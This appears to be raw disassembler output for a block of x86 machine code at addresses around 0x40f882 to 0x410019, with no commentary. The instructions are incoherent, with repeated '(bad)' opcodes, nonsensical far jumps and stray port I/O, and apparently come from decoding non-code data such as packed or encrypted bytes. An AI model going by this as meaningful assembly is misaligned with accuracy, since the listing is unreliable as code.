  40f882:	xchg   BYTE PTR [esi-0x2b],bh
  40f885:	push   0x482fdfcf
  40f88a:	inc    esp
  40f88b:	inc    ebx
  40f88c:	loopne 0x40f834
  40f88e:	jg     0x40f852
  40f890:	inc    esp
  40f892:	cdq    
  40f893:	jg     0x40f8bc
  40f895:	hlt    
  40f896:	mov    eax,ds:0x737281ab
  40f89b:	push   0xffffffad
  40f89d:	(bad)  
  40f89e:	in     al,0x9d
  40f8a0:	scas   eax,DWORD PTR es:[edi]
  40f8a1:	test   eax,0x26719bde
  40f8a6:	retf   
  40f8a7:	les    esp,FWORD PTR [ebp-0x72]
  40f8aa:	div    BYTE PTR [ecx]
  40f8ac:	ins    BYTE PTR es:[edi],dx
  40f8ad:	sub    eax,0x2d142f29
  40f8b2:	imul   edi,DWORD PTR [ebp-0x3],0x6af6a0b5
  40f8b9:	call   FWORD PTR [esi-0x7a1c9d52]
  40f8bf:	shl    ah,cl
  40f8c1:	cmp    al,0xcb
  40f8c3:	int    0x45
  40f8c5:	xchg   ebx,eax
  40f8c6:	imul   ebx,DWORD PTR [edx],0xffffffe9
  40f8c9:	dec    esp
  40f8ca:	ror    BYTE PTR [ecx],1
  40f8cc:	(bad)  
  40f8cd:	jmp    0x32632e64
  40f8d2:	addr16 mov dl,0xa8
  40f8d5:	ins    BYTE PTR es:[edi],dx
  40f8d6:	pop    eax
  40f8d7:	int    0x88
  40f8d9:	jl     0x40f85e
  40f8db:	stos   DWORD PTR es:[edi],eax
  40f8dc:	push   0x46
  40f8de:	inc    ebp
  40f8df:	adc    eax,0xb3aba7b4
  40f8e4:	adc    bh,BYTE PTR [ecx-0xbc3d8ac]
  40f8ea:	inc    esi
  40f8eb:	fcmovne st,st(0)
  40f8ed:	addr16 push eax
  40f8ef:	scas   eax,DWORD PTR es:[edi]
  40f8f0:	test   BYTE PTR [ecx-0x23],0xeb
  40f8f4:	mov    cl,0x11
  40f8f6:	lods   eax,DWORD PTR ds:[esi]
  40f8f7:	fimul  DWORD PTR [ebx+0x17]
  40f8fa:	xchg   esp,eax
  40f8fb:	cmp    eax,0x17123d59
  40f900:	je     0x40f973
  40f902:	cmp    BYTE PTR [ebp+0x62393d1f],bl
  40f908:	mov    ch,0x4b
  40f90a:	popf   
  40f90b:	test   eax,0x17a31af9
  40f910:	mov    cl,0x91
  40f912:	and    eax,0x38a30c1a
  40f917:	repz dec esi
  40f919:	or     edi,DWORD PTR [edx+0x11]
  40f91c:	jmp    0x3acb9602
  40f921:	aam    0xe5
  40f923:	and    cl,bh
  40f925:	hlt    
  40f926:	fstp   DWORD PTR [edx-0x9e91394]
  40f92c:	jb     0x40f923
  40f92e:	dec    eax
  40f92f:	outs   dx,BYTE PTR ds:[esi]
  40f930:	into   
  40f931:	aaa    
  40f932:	test   eax,0x2382b43
  40f937:	clc    
  40f938:	leave  
  40f939:	ins    DWORD PTR es:[edi],dx
  40f93a:	and    cl,ah
  40f93c:	pop    edx
  40f93d:	(bad)  
  40f93e:	call   0x3c23dc7a
  40f943:	fiadd  WORD PTR [ecx+eax*1-0x62]
  40f947:	bound  ecx,QWORD PTR [ecx+eiz*4]
  40f94a:	test   edx,ecx
  40f94c:	pop    ds
  40f94d:	aaa    
  40f94e:	xchg   ecx,eax
  40f94f:	add    bh,BYTE PTR [edx-0x9158ffd]
  40f955:	xchg   edi,eax
  40f956:	ja     0x40f978
  40f958:	test   BYTE PTR [ebp-0x45efee34],bh
  40f95e:	jge    0x40f9c9
  40f960:	imul   ecx,DWORD PTR [ebx+0x25],0x74e2531
  40f967:	popf   
  40f968:	adc    esp,DWORD PTR [esi-0x63]
  40f96b:	pop    ds
  40f96c:	xchg   ecx,eax
  40f96d:	call   0xab03b32
  40f972:	rol    BYTE PTR [edi-0x2cb7f758],1
  40f978:	and    cl,BYTE PTR [ebx+esi*1+0x3a09358c]
  40f97f:	cmp    BYTE PTR [edi],0x76
  40f982:	or     al,ah
  40f984:	adc    BYTE PTR [eax-0xb],0x1a
  40f988:	push   0x2947dcef
  40f98d:	ins    BYTE PTR es:[edi],dx
  40f98e:	mov    al,0x3d
  40f990:	pop    ebp
  40f991:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f992:	test   eax,0xa12620bb
  40f997:	xchg   edi,eax
  40f998:	lods   eax,DWORD PTR ds:[esi]
  40f999:	inc    edx
  40f99a:	xchg   esp,eax
  40f99b:	gs popf 
  40f99d:	mov    esi,DWORD PTR [ebp-0x714ce3e3]
  40f9a3:	push   ecx
  40f9a4:	ret    
  40f9a5:	xor    DWORD PTR [edx+0x5b],ecx
  40f9a8:	aaa    
  40f9a9:	int3   
  40f9aa:	inc    esi
  40f9ab:	sbb    al,0x2d
  40f9ad:	(bad)  
  40f9ae:	das    
  40f9af:	cmp    DWORD PTR [ebx],eax
  40f9b1:	dec    edi
  40f9b2:	cld    
  40f9b3:	test   eax,0xdd62e239
  40f9b8:	add    DWORD PTR ds:0x98eeba1a,0xad1a4cc
  40f9c2:	shr    DWORD PTR [edx-0x7b58bd7a],1
  40f9c8:	jecxz  0x40f94b
  40f9ca:	inc    ebx
  40f9cb:	inc    eax
  40f9cc:	lods   al,BYTE PTR ds:[esi]
  40f9cd:	mov    eax,ds:0x652d498a
  40f9d2:	scas   al,BYTE PTR es:[edi]
  40f9d3:	add    BYTE PTR [ecx+esi*2-0x5ca06d3a],al
  40f9da:	int    0xbf
  40f9dc:	mov    ecx,0x736450ef
  40f9e1:	fcom   QWORD PTR [eax-0x2]
  40f9e4:	mov    al,0x50
  40f9e6:	xchg   DWORD PTR [esi-0x4d69b940],ecx
  40f9ec:	mov    ebx,0xde997a7e
  40f9f1:	cmp    DWORD PTR [ebp+0x19ee87c],ecx
  40f9f7:	fstp   QWORD PTR [esi]
  40f9f9:	stos   DWORD PTR es:[edi],eax
  40f9fa:	repnz sbb eax,0xff3ec579
  40fa00:	pop    eax
  40fa01:	add    DWORD PTR [eax],edx
  40fa03:	push   es
  40fa04:	mov    DWORD PTR [ecx],ebp
  40fa06:	clc    
  40fa07:	pop    edi
  40fa08:	cmp    cl,BYTE PTR [ebp+0x1a]
  40fa0b:	or     eax,0x178f78cb
  40fa10:	jp     0x40fa00
  40fa12:	fisttp DWORD PTR [edx]
  40fa14:	and    al,0xd6
  40fa16:	fadd   st(2),st
  40fa18:	mov    al,ds:0x7c20f43e
  40fa1d:	in     al,0x99
  40fa1f:	(bad)  
  40fa20:	out    dx,al
  40fa21:	sbb    al,0x24
  40fa23:	and    ch,dh
  40fa25:	pushf  
  40fa26:	push   ebx
  40fa27:	or     bl,BYTE PTR [edi]
  40fa29:	and    BYTE PTR [eax],bl
  40fa2b:	push   esi
  40fa2c:	neg    cl
  40fa2e:	outs   dx,BYTE PTR ds:[esi]
  40fa2f:	mov    bh,0xeb
  40fa31:	inc    esp
  40fa32:	shr    DWORD PTR [ecx-0x39],cl
  40fa35:	cld    
  40fa36:	aad    0x8
  40fa38:	inc    edx
  40fa39:	mov    ebx,0x64e4930
  40fa3e:	hlt    
  40fa3f:	cmc    
  40fa40:	dec    esp
  40fa41:	push   ds
  40fa42:	in     al,0x65
  40fa44:	stc    
  40fa45:	rcl    DWORD PTR ds:0x306ba607,0x6f
  40fa4c:	sbb    eax,0x232c4e25
  40fa51:	and    DWORD PTR [edi+0x78314626],ebx
  40fa57:	mov    eax,ds:0x80abb308
  40fa5c:	mov    ch,0xb
  40fa5e:	push   es
  40fa5f:	iret   
  40fa60:	addr16 retf 
  40fa62:	std    
  40fa63:	or     BYTE PTR [edi+ebx*4-0x7ba66362],dl
  40fa6a:	fbld   TBYTE PTR [ebx+0x4]
  40fa6d:	or     eax,0xfe241f6c
  40fa72:	push   cs
  40fa73:	ins    BYTE PTR es:[edi],dx
  40fa74:	imul   DWORD PTR [edi+eiz*8-0x50]
  40fa78:	push   cs
  40fa79:	je     0x40fa0a
  40fa7b:	cs loope 0x40faeb
  40fa7e:	sbb    DWORD PTR [edi],0xffffffdc
  40fa81:	sbb    BYTE PTR [edx+0x38],dl
  40fa84:	cmp    ebp,DWORD PTR [edx+0x13]
  40fa87:	mov    ds:0xa10724af,eax
  40fa8c:	push   0x7f
  40fa8e:	les    eax,FWORD PTR [edx]
  40fa90:	test   al,0x98
  40fa92:	mov    bl,0x21
  40fa94:	retf   
  40fa95:	sub    bl,dh
  40fa97:	rcr    BYTE PTR [ebx+edx*8-0x4a],1
  40fa9b:	int    0x20
  40fa9d:	sub    bh,BYTE PTR [eax+eax*8+0x402ef5cf]
  40faa4:	pop    edx
  40faa5:	fnstenv [edx]
  40faa7:	xor    al,0x27
  40faa9:	call   0x1fbe9280
  40faae:	or     dl,BYTE PTR [ecx+0x11]
  40fab1:	add    al,0xe2
  40fab3:	jmp    0x40faa4
  40fab5:	xor    eax,0x8deabd92
  40faba:	rol    BYTE PTR [edi+0x14],0xa2
  40fabe:	mov    bl,0xe1
  40fac0:	(bad)  
  40fac2:	fstp   QWORD PTR [edi+esi*2+0x22]
  40fac6:	jp     0x40fb33
  40fac8:	push   cs
  40fac9:	adc    DWORD PTR [ecx+0x5e],0x1
  40facd:	cld    
  40face:	xchg   edx,eax
  40facf:	scas   al,BYTE PTR es:[edi]
  40fad0:	mov    eax,ds:0xf80fa498
  40fad5:	pop    ebx
  40fad6:	jae    0x40faee
  40fad8:	fild   QWORD PTR [edx+0x2cf99a13]
  40fade:	pusha  
  40fadf:	loope  0x40faa1
  40fae1:	je     0x40face
  40fae3:	call   0xbf83:0x35fc36bc
  40faea:	push   ds
  40faeb:	sub    edi,DWORD PTR [edx+ecx*8+0x10c98a86]
  40faf2:	cmp    al,0x89
  40faf4:	fdivrp st(5),st
  40faf6:	add    BYTE PTR [edx+eax*4+0x4a1f5af9],al
  40fafd:	mov    ah,0xdf
  40faff:	mov    esp,0x8d744c2b
  40fb04:	test   eax,0x777d9664
  40fb09:	stos   DWORD PTR es:[edi],eax
  40fb0a:	lahf   
  40fb0b:	inc    ecx
  40fb0c:	aas    
  40fb0d:	sub    bh,BYTE PTR [edi*4+0x4ded5245]
  40fb14:	sbb    eax,0xfb1e80dc
  40fb19:	rcl    BYTE PTR ds:0x81442b55,0x5a
  40fb20:	push   esp
  40fb21:	adc    eax,0x3ce7147b
  40fb26:	into   
  40fb27:	xchg   DWORD PTR [edx+edi*8+0x65],esp
  40fb2b:	mov    bl,0x8e
  40fb2d:	add    al,0x37
  40fb2f:	aad    0x10
  40fb31:	rol    BYTE PTR [edi-0x2f],1
  40fb34:	xor    al,0x9e
  40fb36:	arpl   WORD PTR [edx-0x1a],cx
  40fb39:	arpl   WORD PTR [edx-0x456d24c],ax
  40fb3f:	mov    gs,esp
  40fb41:	xor    ah,BYTE PTR [edi+0x5]
  40fb44:	ss xor al,0x21
  40fb47:	sub    al,0xe8
  40fb49:	test   al,0x49
  40fb4b:	fs mov ch,0xd1
  40fb4e:	shl    BYTE PTR ds:0x6d486a6c,cl
  40fb54:	jmp    0xe4c7ac36
  40fb59:	bound  esi,QWORD PTR [eax]
  40fb5b:	js     0x40fb03
  40fb5d:	mov    esp,0x18c9820a
  40fb62:	imul   ecx
  40fb64:	out    0x36,eax
  40fb66:	pop    es
  40fb67:	cmp    DWORD PTR [esi-0x2c],esi
  40fb6a:	js     0x40fb20
  40fb6c:	xor    DWORD PTR [eax],0x23
  40fb6f:	push   0xffffffb0
  40fb71:	jb     0x40fb63
  40fb73:	lock xor eax,0x1e9146ee
  40fb79:	shr    DWORD PTR [ebx+edx*4],1
  40fb7c:	lods   eax,DWORD PTR ds:[esi]
  40fb7d:	dec    edi
  40fb7e:	or     BYTE PTR [ecx],0xa0
  40fb81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb82:	ficomp DWORD PTR [eax]
  40fb84:	cmp    ecx,DWORD PTR [ecx-0x2e]
  40fb87:	mov    ?,WORD PTR [edx]
  40fb89:	shr    BYTE PTR [eax+eax*2],1
  40fb8c:	xor    al,0x9f
  40fb8e:	loope  0x40fba2
  40fb90:	(bad)  
  40fb91:	out    dx,eax
  40fb92:	and    al,0x1
  40fb94:	neg    ebp
  40fb96:	pop    es
  40fb97:	sbb    ah,BYTE PTR es:[ebx]
  40fb9a:	fs sub al,0x67
  40fb9d:	dec    esp
  40fb9e:	mov    dh,0xa9
  40fba0:	mov    ecx,DWORD PTR [edi]
  40fba2:	loope  0x40fb30
  40fba4:	adc    eax,0x8c07955
  40fba9:	imul   esp,DWORD PTR [eax],0xffffffb9
  40fbac:	jmp    0xd057:0x302f5ec7
  40fbb3:	shl    DWORD PTR [ebx],0xb7
  40fbb6:	mov    dh,0x95
  40fbb8:	std    
  40fbb9:	cmp    al,0xa8
  40fbbb:	mov    ecx,0xa378b19f
  40fbc0:	mov    ch,0xd3
  40fbc2:	imul   esp,DWORD PTR [edx],0x191848bc
  40fbc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fbc9:	pushf  
  40fbca:	pop    DWORD PTR [edi-0x28ec266e]
  40fbd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fbd1:	nop
  40fbd2:	dec    edi
  40fbd3:	shl    DWORD PTR [eax+edx*4-0x1a31cc8c],1
  40fbda:	mov    bl,0xf7
  40fbdc:	gs stc 
  40fbde:	sub    al,0xfd
  40fbe0:	ja     0x40fbca
  40fbe2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fbe3:	jmp    0x40fb9e
  40fbe5:	mov    dl,0xce
  40fbe7:	cmc    
  40fbe8:	jecxz  0x40fc33
  40fbea:	push   ds
  40fbeb:	out    0x3d,eax
  40fbed:	adc    al,0x55
  40fbef:	or     edi,DWORD PTR [edi+0x42a5418a]
  40fbf5:	push   ebp
  40fbf6:	gs cdq 
  40fbf8:	mov    cs,WORD PTR [edx-0x4]
  40fbfb:	sbb    ch,dh
  40fbfd:	fs in  al,0x1c
  40fc00:	lds    edi,FWORD PTR [edx]
  40fc02:	jmp    0x52f9a2dc
  40fc07:	retf   0xebe1
  40fc0a:	xlat   BYTE PTR ds:[ebx]
  40fc0b:	mov    dh,dl
  40fc0d:	and    BYTE PTR ds:0xbba2894b,bl
  40fc13:	fadd   QWORD PTR [ebp+eiz*4+0x67]
  40fc17:	popf   
  40fc18:	pop    ecx
  40fc19:	cwde   
  40fc1a:	jns    0x40fbbf
  40fc1c:	out    dx,al
  40fc1d:	or     al,0xe1
  40fc1f:	and    edx,DWORD PTR [edi]
  40fc21:	ds cld 
  40fc23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc24:	xor    edx,DWORD PTR [edx+0x5c4fa333]
  40fc2a:	sar    DWORD PTR [ebx+0x7021b21e],1
  40fc30:	adc    BYTE PTR [edi],al
  40fc32:	mov    dh,0x41
  40fc34:	dec    ecx
  40fc35:	pusha  
  40fc36:	cmp    cl,BYTE PTR [edi+0x4c]
  40fc39:	cmp    al,0xf
  40fc3b:	rcr    BYTE PTR [edi+0x63],0x4c
  40fc3f:	mov    cl,0xca
  40fc41:	pop    ebp
  40fc42:	jns    0x40fbfb
  40fc44:	call   0x97ee:0xbe00dabc
  40fc4b:	xor    al,0xb7
  40fc4d:	cmp    BYTE PTR [eax],ah
  40fc4f:	out    0x5c,eax
  40fc51:	lahf   
  40fc52:	stos   DWORD PTR es:[edi],eax
  40fc53:	xchg   BYTE PTR [esi+0x473a5c44],al
  40fc59:	inc    esi
  40fc5a:	retf   
  40fc5b:	aas    
  40fc5c:	fucomi st,st(6)
  40fc5e:	pop    esp
  40fc5f:	aas    
  40fc60:	ins    DWORD PTR es:[edi],dx
  40fc61:	test   DWORD PTR es:[esi+eiz*1+0x53],ebp
  40fc66:	js     0x40fc07
  40fc68:	xchg   ebx,eax
  40fc69:	xchg   ebx,eax
  40fc6a:	mov    bh,0x1
  40fc6c:	popa   
  40fc6d:	xchg   esp,eax
  40fc6e:	xor    al,0x19
  40fc71:	sar    BYTE PTR [ebx-0x78],cl
  40fc74:	rcr    ch,cl
  40fc76:	mov    ebx,0x66d47f9a
  40fc7b:	mov    edi,0xf2e018dd
  40fc80:	gs push ebp
  40fc82:	push   0xffffff99
  40fc84:	fnstcw WORD PTR [esi]
  40fc86:	inc    esp
  40fc87:	cli    
  40fc88:	(bad)  
  40fc89:	jmp    0x40fce8
  40fc8b:	and    eax,0x98c7cb0b
  40fc90:	nop
  40fc91:	push   esi
  40fc92:	repz or edi,0xba84ea37
  40fc99:	ror    DWORD PTR [edx],cl
  40fc9b:	add    esi,0x14
  40fc9e:	push   esi
  40fc9f:	bound  ebx,QWORD PTR [esi-0x20]
  40fca2:	push   edi
  40fca3:	dec    edx
  40fca5:	dec    ebx
  40fca6:	dec    ecx
  40fca7:	pop    ebp
  40fca8:	iret   
  40fca9:	repz ss (bad) 
  40fcad:	sub    al,BYTE PTR [ebx]
  40fcaf:	outs   dx,BYTE PTR ds:[esi]
  40fcb0:	mov    ?,WORD PTR [ebx]
  40fcb2:	xchg   esi,eax
  40fcb3:	mov    BYTE PTR [ecx-0x25],bl
  40fcb6:	mov    bl,0x76
  40fcb8:	jle    0x40fc64
  40fcba:	push   ecx
  40fcbb:	xlat   BYTE PTR ds:[ebx]
  40fcbc:	cdq    
  40fcbd:	icebp  
  40fcbe:	lock jge 0x40fc54
  40fcc1:	dec    ebx
  40fcc2:	les    esi,FWORD PTR [ebp+0x22]
  40fcc5:	mov    esp,0x1d4c182a
  40fcca:	and    DWORD PTR [esi+0x95deb7f],ebp
  40fcd0:	dec    edi
  40fcd1:	ss xchg edx,eax
  40fcd3:	sbb    DWORD PTR [esi+ebx*2],esp
  40fcd6:	in     eax,0xe5
  40fcd8:	xor    al,0xd6
  40fcda:	xchg   edi,eax
  40fcdb:	sbb    al,BYTE PTR [edi]
  40fcdd:	call   0xa16a82c9
  40fce2:	jbe    0x40fccd
  40fce4:	mov    eax,ds:0x4c531fdb
  40fce9:	dec    ebx
  40fcea:	mov    edi,0x6caa6143
  40fcef:	shr    ebx,cl
  40fcf1:	and    cl,BYTE PTR es:[ebx+0x1c4b8347]
  40fcf8:	sub    DWORD PTR [edx+0x3f],eax
  40fcfb:	pushf  
  40fcfc:	jmp    0x9bcc:0xd0cc217
  40fd03:	push   ecx
  40fd04:	out    dx,eax
  40fd05:	fsub   QWORD PTR [edi-0x7033dce7]
  40fd0b:	sbb    edi,DWORD PTR [edx+0x6d]
  40fd0e:	jno    0x40fd4f
  40fd10:	rol    DWORD PTR [eax+0x4b58fc55],1
  40fd16:	ss (bad) 
  40fd18:	mov    edi,0x455a8ac4
  40fd1d:	xchg   BYTE PTR [eax],ch
  40fd1f:	mov    WORD PTR [ebx],cs
  40fd21:	inc    edi
  40fd22:	and    eax,0x6d313241
  40fd27:	xlat   BYTE PTR ds:[ebx]
  40fd28:	cli    
  40fd29:	mov    eax,fs:0x89ed48c7
  40fd2f:	add    al,0x5b
  40fd31:	pushf  
  40fd32:	pop    edx
  40fd33:	mov    edx,0x309d0fac
  40fd38:	(bad)  [ebx]
  40fd3a:	sahf   
  40fd3b:	scas   al,BYTE PTR es:[edi]
  40fd3c:	fwait
  40fd3d:	adc    BYTE PTR [edi-0x38],cl
  40fd40:	fidiv  DWORD PTR [ecx]
  40fd42:	(bad)  [edx-0x1db57ca4]
  40fd48:	sbb    al,BYTE PTR [ebp-0x5645e29c]
  40fd4e:	or     ebp,DWORD PTR [eax]
  40fd50:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd52:	ror    BYTE PTR [esi-0x277ed64d],0xe3
  40fd59:	and    eax,0x27f48d3
  40fd5e:	cmp    esi,edx
  40fd60:	pop    edx
  40fd61:	inc    ecx
  40fd62:	inc    ecx
  40fd63:	push   es
  40fd64:	aas    
  40fd65:	repnz xchg edi,eax
  40fd67:	adc    eax,0x6ebdf808
  40fd6c:	(bad)
  40fd70:	xchg   esp,eax
  40fd71:	mov    ah,0x5b
  40fd73:	ins    DWORD PTR es:[edi],dx
  40fd74:	or     dh,BYTE PTR ds:0x3c3fe97e
  40fd7a:	ror    DWORD PTR [eax],cl
  40fd7c:	call   0x8908:0x75063980
  40fd83:	mov    al,ds:0x990f5a7c
  40fd88:	js     0x40fd48
  40fd8a:	and    al,0x93
  40fd8c:	je     0x40fdbe
  40fd8e:	xchg   esp,eax
  40fd8f:	jp     0x40fe0b
  40fd91:	call   0xf1fd937a
  40fd96:	cdq    
  40fd97:	out    dx,eax
  40fd98:	jge    0x40fdc7
  40fd9a:	ds jmp 0x40fd52
  40fd9d:	xor    DWORD PTR ds:0x24a6ca73,edx
  40fda3:	xchg   esi,eax
  40fda4:	sbb    DWORD PTR [eax-0xa],ebp
  40fda7:	jmp    0x40fd4b
  40fda9:	cmp    BYTE PTR [ebx-0x6b4d63d2],0xdf
  40fdb0:	pusha  
  40fdb1:	je     0x40fd8c
  40fdb3:	jp     0x40fdf6
  40fdb5:	sahf   
  40fdb6:	add    al,0xce
  40fdb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fdb9:	arpl   WORD PTR [edi-0x53],bp
  40fdbc:	inc    edi
  40fdbd:	pop    eax
  40fdbe:	rcr    edi,cl
  40fdc0:	push   ds
  40fdc1:	dec    ebp
  40fdc2:	adc    DWORD PTR [ecx+0xa94da4b],edx
  40fdc8:	dec    ecx
  40fdca:	mov    ds:0xae28ce1,eax
  40fdcf:	mov    ds:0xd11bc561,al
  40fdd4:	mov    ebx,0x923ae6a5
  40fdd9:	sub    ecx,DWORD PTR [edx+0x51c63249]
  40fddf:	or     esi,DWORD PTR [ecx]
  40fde1:	push   cs
  40fde2:	cmp    edx,ebx
  40fde4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fde5:	dec    ebx
  40fde6:	ja     0x40fdff
  40fde8:	adc    eax,0x8b7cb6e3
  40fded:	cmp    eax,0x69ed70b9
  40fdf2:	ins    BYTE PTR es:[edi],dx
  40fdf3:	cmp    eax,0x5c033a8d
  40fdf8:	js     0x40fd87
  40fdfa:	sub    DWORD PTR [eax],esi
  40fdfc:	cmp    esp,edx
  40fdfe:	xchg   edi,eax
  40fdff:	add    DWORD PTR [esp+edi*4+0x10],0xcd93b992
  40fe07:	ret    
  40fe08:	and    eax,0xf0abd328
  40fe0d:	sub    bl,bl
  40fe0f:	push   es
  40fe10:	lods   al,BYTE PTR ds:[esi]
  40fe11:	data16 jge 0x40fe70
  40fe14:	stos   DWORD PTR es:[edi],eax
  40fe15:	pop    ecx
  40fe16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe17:	adc    esi,DWORD PTR [ebp-0x5b]
  40fe1a:	push   0x2f
  40fe1c:	and    edi,DWORD PTR [esi*1+0x3a6b3fee]
  40fe23:	sbb    esp,DWORD PTR [ecx-0xc]
  40fe26:	push   0xe8f6948e
  40fe2b:	pop    ebp
  40fe2c:	scas   eax,DWORD PTR es:[edi]
  40fe2d:	add    BYTE PTR [ecx],bl
  40fe2f:	imul   BYTE PTR [edi+0x75a1f4ec]
  40fe35:	and    eax,0x341eb3f1
  40fe3a:	pop    DWORD PTR [edi-0xb]
  40fe3d:	jg     0x40fdd2
  40fe3f:	mov    ecx,0x267f3212
  40fe44:	in     al,0xb1
  40fe46:	xchg   ecx,eax
  40fe47:	pop    ss
  40fe48:	arpl   WORD PTR [esp+esi*2-0xa57ab9],ax
  40fe4f:	lds    esp,FWORD PTR [ebx+eiz*8-0x2e]
  40fe53:	and    eax,0x1eb2a27c
  40fe58:	jae    0x40fe44
  40fe5a:	xchg   ebp,eax
  40fe5b:	cmc    
  40fe5c:	xchg   esi,eax
  40fe5d:	pop    esp
  40fe5e:	fcmovnu st,st(1)
  40fe60:	and    edi,esi
  40fe62:	retf   0xe82a
  40fe65:	xchg   ebp,eax
  40fe66:	hlt    
  40fe67:	mov    bh,0xe3
  40fe69:	popf   
  40fe6a:	retf   
  40fe6b:	xchg   esp,eax
  40fe6c:	(bad)  
  40fe6d:	xor    DWORD PTR [edx-0x68],0xd89564e4
  40fe74:	mov    ch,bh
  40fe76:	xchg   edx,esi
  40fe78:	in     al,0xd4
  40fe7a:	enter  0xf618,0x52
  40fe7e:	ds and eax,0x9be2d213
  40fe84:	mov    bh,0xab
  40fe86:	mov    al,0xfc
  40fe88:	cmp    al,0xf5
  40fe8a:	in     al,0x8a
  40fe8c:	leave  
  40fe8d:	out    0x18,eax
  40fe8f:	add    ecx,DWORD PTR es:[edi]
  40fe92:	inc    esi
  40fe93:	jb     0x40feed
  40fe95:	clc    
  40fe96:	(bad)  
  40fe97:	clc    
  40fe98:	add    eax,0xe2fb0575
  40fe9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe9e:	push   ecx
  40fe9f:	push   cs
  40fea0:	pop    eax
  40fea1:	cmp    edx,DWORD PTR [edi-0x40a0336b]
  40fea7:	loope  0x40feae
  40fea9:	cmp    ah,dl
  40feab:	pushf  
  40feac:	jge    0x40fe63
  40feae:	sahf   
  40feaf:	fsub   DWORD PTR [eax+0x79e12408]
  40feb5:	inc    ecx
  40feb6:	xchg   BYTE PTR [edi-0x5f],bl
  40feb9:	mov    bl,BYTE PTR [edi+0x6adc4364]
  40febf:	test   eax,0xab05d339
  40fec4:	jns    0x40fe90
  40fec6:	ds mov ebp,0xa52511f
  40fecd:	fbstp  TBYTE PTR [ecx-0x5800f4cd]
  40fed3:	lds    edx,FWORD PTR [esp+esi*8]
  40fed6:	in     eax,dx
  40fed7:	sub    ebp,DWORD PTR [eax-0x1a]
  40feda:	mov    ebp,0x5200137d
  40fedf:	inc    esi
  40fee0:	dec    eax
  40fee1:	aas    
  40fee2:	and    al,0xe
  40fee4:	adc    eax,0xddfece42
  40fee9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40feea:	inc    esp
  40feeb:	add    BYTE PTR [edx],ch
  40feed:	mov    ds:0xa0101591,al
  40fef2:	ficomp DWORD PTR [esi]
  40fef4:	adc    dl,al
  40fef6:	cmovns eax,DWORD PTR [eax+0x6d0c20e5]
  40fefd:	out    0xa9,al
  40feff:	out    dx,al
  40ff00:	test   ebp,edi
  40ff02:	push   esp
  40ff04:	push   eax
  40ff05:	jno    0x40ff4f
  40ff07:	cmp    BYTE PTR [ebp+0x71],ch
  40ff0a:	pop    ebp
  40ff0b:	fdiv   QWORD PTR [edi-0x4c412eb1]
  40ff11:	dec    ebx
  40ff12:	and    BYTE PTR ds:0x642c44ed,dh
  40ff18:	and    ebx,esp
  40ff1a:	pop    ss
  40ff1b:	sbb    edi,DWORD PTR [edi+0x6b45744b]
  40ff21:	mov    dh,0x2f
  40ff23:	pusha  
  40ff24:	mov    WORD PTR [esi],cs
  40ff26:	xchg   ecx,eax
  40ff27:	rol    BYTE PTR [esi+0x65],1
  40ff2a:	scas   eax,DWORD PTR es:[edi]
  40ff2b:	inc    esp
  40ff2c:	icebp  
  40ff2d:	xor    al,0xb0
  40ff2f:	mov    al,ds:0xc5bb1269
  40ff34:	dec    edi
  40ff35:	test   DWORD PTR ds:0xd5ec500a,ebx
  40ff3b:	push   eax
  40ff3c:	pop    esi
  40ff3d:	pop    es
  40ff3e:	cs in  al,0x4b
  40ff41:	sbb    al,0x9b
  40ff43:	mov    ah,0xa0
  40ff45:	dec    esp
  40ff46:	and    bh,BYTE PTR [edx]
  40ff48:	xchg   edx,eax
  40ff49:	out    0x91,eax
  40ff4b:	shr    DWORD PTR [eax-0x6345d8e5],1
  40ff51:	je     0x40ff0c
  40ff53:	push   edx
  40ff54:	imul   edi
  40ff56:	push   eax
  40ff57:	rol    BYTE PTR [esi+eax*8+0x4f],cl
  40ff5b:	add    esi,DWORD PTR [ecx-0x74a21afb]
  40ff61:	lahf   
  40ff62:	pop    ds
  40ff63:	jl     0x40ff4c
  40ff65:	call   0x9e57:0x5c74bbac
  40ff6c:	xlat   BYTE PTR ds:[ebx]
  40ff6d:	aam    0xa2
  40ff6f:	mov    ch,0xb
  40ff71:	mov    dh,0xc1
  40ff73:	retf   
  40ff74:	cmp    eax,0x0
	...
  40ffbd:	add    BYTE PTR [eax],al
  40ffbf:	outs   dx,DWORD PTR ds:[esi]
  40ffc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ffc1:	daa    
  40ffc2:	jbe    0x40ffb3
  40ffc4:	idiv   DWORD PTR [edi-0x43]
  40ffc7:	mov    ecx,0xac16f8af
  40ffcc:	inc    ebp
  40ffcd:	fbld   TBYTE PTR [edi-0x35]
  40ffd0:	add    al,0x1
  40ffd2:	add    BYTE PTR [esi],bl
  40ffd4:	pop    es
  40ffd5:	add    BYTE PTR [eax],al
  40ffd7:	repnz out dx,eax
  40ffd9:	mov    al,ds:0x169db995
  40ffde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffdf:	loope  0x41005a
  40ffe1:	or     eax,0xabe9f72c
  40ffe6:	in     al,0x8c
  40ffe8:	das    
  40ffe9:	sub    ch,al
  40ffeb:	sbb    al,0x20
  40ffed:	pop    es
  40ffee:	pushf  
  40ffef:	push   eax
  40fff0:	pop    esi
  40fff1:	scas   eax,DWORD PTR es:[edi]
  40fff2:	xchg   edi,eax
  40fff3:	cld    
  40fff4:	into   
  40fff5:	cwde   
  40fff6:	add    DWORD PTR [esi-0x5d],0xffffffec
  40fffa:	or     al,0x6d
  40fffc:	pop    ss
  40fffd:	pushf  
  40fffe:	add    cl,cl
  410000:	adc    eax,0x2de35d
  410006:	gs adc eax,0x96827eb1
  41000c:	and    dh,0xd6
  41000f:	jle    0x41004b
  410011:	mov    ecx,0xd71bb547
  410016:	ss dec esi
  410018:	dec    esi
  410019:	fldcw  WORD PTR [ebp+0x41aa05de]
